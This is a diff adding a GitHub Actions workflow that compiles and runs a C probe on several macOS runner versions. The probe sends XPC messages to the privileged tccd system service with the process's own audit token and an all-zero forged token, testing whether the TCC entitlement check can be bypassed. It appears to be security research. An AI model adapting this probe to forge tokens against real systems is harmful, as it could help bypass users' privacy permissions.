@@ -1,0 +1,116 @@
+name: tccd-forge-probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [macos-15, macos-14, macos-13]
+    runs-on: ${{ matrix.os }}
+    continue-on-error: true
+    timeout-minutes: 12
+    steps:
+      - name: can a client forge an XPC audit-token object?
+        run: |
+          set +e
+          echo "runner=${{ matrix.os }} macOS=$(sw_vers -productVersion)"
+          mkdir -p /tmp/fp
+          cat > /tmp/fp/p.c <<'CEOF'
+          #include <stdio.h>
+          #include <unistd.h>
+          #include <dlfcn.h>
+          #include <string.h>
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <sys/proc_info.h>
+          #include <libproc.h>
+
+          typedef void (*set_at_fn)(xpc_object_t, const char *, const void *);
+
+          static const char *SVC = "com.apple.tccd.system";
+
+          // 发一条消息；tok!=NULL 时先尝试把该 32 字节 token 塞进消息
+          static int send_msg(const char *msgid, const void *tok, const char *tag) {
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+              __block int result = -1;
+              __block int got = 0;
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+                  if (xpc_get_type(ev) == XPC_TYPE_ERROR) {
+                      const char *d = xpc_dictionary_get_string(ev, XPC_ERROR_KEY_DESCRIPTION);
+                      printf("    [%s] event ERROR: %s\n", tag, d ? d : "?");
+                      got = 1; dispatch_semaphore_signal(sem);
+                  }
+              });
+              xpc_connection_resume(c);
+
+              xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_string(m, "TCCD_MSG_ID", msgid);
+              xpc_dictionary_set_int64(m, "pid", getpid());
+              xpc_dictionary_set_int64(m, "responsible_pid", 0);
+              if (tok) {
+                  set_at_fn f = (set_at_fn)dlsym(RTLD_DEFAULT, "xpc_dictionary_set_audit_token");
+                  if (f) { f(m, "target_token", tok); printf("    [%s] set_audit_token SPI 存在，已塞入 token\n", tag); }
+                  else   { printf("    [%s] set_audit_token SPI 不存在，无法塞 token\n", tag); }
+              }
+              xpc_connection_send_message_with_reply(c, m, dispatch_get_global_queue(0,0), ^(xpc_object_t r) {
+                  if (xpc_get_type(r) == XPC_TYPE_ERROR) {
+                      const char *d = xpc_dictionary_get_string(r, XPC_ERROR_KEY_DESCRIPTION);
+                      printf("    [%s] reply ERROR: %s\n", tag, d ? d : "?");
+                  } else {
+                      result = (int)xpc_dictionary_get_bool(r, "result");
+                      printf("    [%s] reply result=%d\n", tag, result);
+                  }
+                  got = 1; dispatch_semaphore_signal(sem);
+              });
+              dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5ll*NSEC_PER_SEC));
+              if (!got) printf("    [%s] TIMEOUT\n", tag);
+              xpc_release(m);
+              xpc_connection_cancel(c);
+              return result;
+          }
+
+          int main(void) {
+            printf("uid=%d pid=%d\n", getuid(), geteuid());
+
+            printf("\n[A] SPI 探测\n");
+            void *spi = dlsym(RTLD_DEFAULT, "xpc_dictionary_set_audit_token");
+            printf("    xpc_dictionary_set_audit_token = %s\n", spi ? "PRESENT" : "ABSENT");
+            void *spi2 = dlsym(RTLD_DEFAULT, "xpc_dictionary_get_audit_token");
+            printf("    xpc_dictionary_get_audit_token = %s\n", spi2 ? "PRESENT" : "ABSENT");
+
+            printf("\n[B] 自带真实 audit token（应过不了 entitlement）\n");
+            struct proc_pidinfo_audit_token { unsigned int t[8]; } tok;
+            memset(&tok, 0, sizeof tok);
+            int rc = proc_pidinfo(getpid(), 22 /*PROC_PIDT_AUDIT_TOKEN*/, 0, &tok, sizeof tok);
+            printf("    proc_pidinfo(PROC_PIDT_AUDIT_TOKEN) rc=%d size=%d\n", rc, (int)sizeof tok);
+            if (rc == (int)sizeof tok) send_msg("TCCAccessSetPidResponsibleForPid", &tok, "own-token");
+            else send_msg("TCCAccessSetPidResponsibleForPid", NULL, "no-token");
+
+            printf("\n[C] 全零伪 token\n");
+            unsigned int zero[8] = {0};
+            send_msg("TCCAccessSetPidResponsibleForPid", zero, "zero-token");
+
+            printf("\n[D] 读只读消息做对照（不需要 entitlement）\n");
+            send_msg("TCCCheckIfDatabaseIsRegistered", NULL, "readonly");
+
+            printf("\n== done ==\n");
+            return 0;
+          }
+          CEOF
+          clang -fblocks -framework Foundation -lxpc -o /tmp/fp/p /tmp/fp/p.c 2>&1 | tail -20
+          ls -la /tmp/fp/p 2>/dev/null
+          codesign -s - /tmp/fp/p 2>&1
+          echo "--- run ---"
+          /tmp/fp/p 2>&1
+          echo "--- rc=$? ---"
+
+      - name: context
+        run: |
+          set +e
+          echo "=== tccd.system plist ==="
+          plutil -p /System/Library/LaunchDaemons/com.apple.tccd.system.plist 2>&1 | head -25
+          echo "=== tccd processes ==="
+          ps -Ao pid,user,comm | grep -i tccd | head -5
